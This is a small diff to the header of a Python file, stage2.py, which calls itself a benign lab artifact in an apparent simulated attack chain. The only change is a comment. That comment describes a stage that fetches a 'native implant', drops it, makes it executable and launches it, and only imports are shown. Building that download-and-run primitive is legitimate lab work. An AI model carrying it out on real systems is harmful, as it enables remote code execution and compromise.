@@ -1,7 +1,7 @@
 # stage2.py  --  LAB ARTIFACT, BENIGN.
 #
 # Stage 4/5 bridge. Downloaded and exec()'d by the isolated child interpreter that
-# struct_shadow.py spawned. Fetches the "native implant", drops it, marks it
+# the struct.py shim spawned. Fetches the "native implant", drops it, marks it
 # executable, and launches it -- the download-then-chmod+x-then-run primitive.
 import os, urllib.request, subprocess, stat, tempfile
 
